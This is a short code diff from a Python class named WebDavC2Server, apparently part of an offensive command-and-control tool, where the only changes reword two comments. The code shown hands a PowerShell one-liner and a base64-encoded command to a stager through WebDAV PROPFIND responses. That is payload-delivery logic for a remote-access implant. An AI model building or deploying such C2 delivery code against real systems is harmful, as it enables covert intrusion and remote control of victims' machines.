@@ -91,13 +91,13 @@ class WebDavC2Server(Thread):
 								
 							elif request.headers['Depth'] == '1':
 							
-								#---- Stager is requesting for the powershell one liner
+								#---- Stager is requesting the full powershell one liner
 								if request.path.startswith('/oneliner'):
 									oneLiner = GenStager.oneLiner({'serverName': serverName})
 									response = self.propfindResponse(oneLiner)
 									print helpers.color ("[+] Sending powershell one liner")
 							
-								#---- Stager is requesting for the powershell encoded command
+								#---- Stager is requesting the powershell encoded command only
 								if request.path.startswith('/encoded'):
 									encodedCommand = GenStager.encodedCommand({'serverName': serverName})
 									# The data is already base64 encoded, so no need to encode it again, setting encode=False
